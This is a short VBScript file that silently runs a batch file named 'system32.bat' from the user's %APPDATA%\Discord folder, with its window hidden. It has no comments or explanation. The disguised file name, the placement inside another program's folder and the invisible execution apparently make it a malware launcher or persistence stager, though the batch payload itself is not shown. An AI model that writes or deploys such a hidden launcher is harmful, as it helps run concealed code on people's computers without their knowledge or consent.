Set WshShell = CreateObject("WScript.Shell")
Dim yol
yol = WshShell.ExpandEnvironmentStrings("%APPDATA%\Discord")
WshShell.Run """" & yol & "\system32.bat""", 0, False
Set WshShell = Nothing
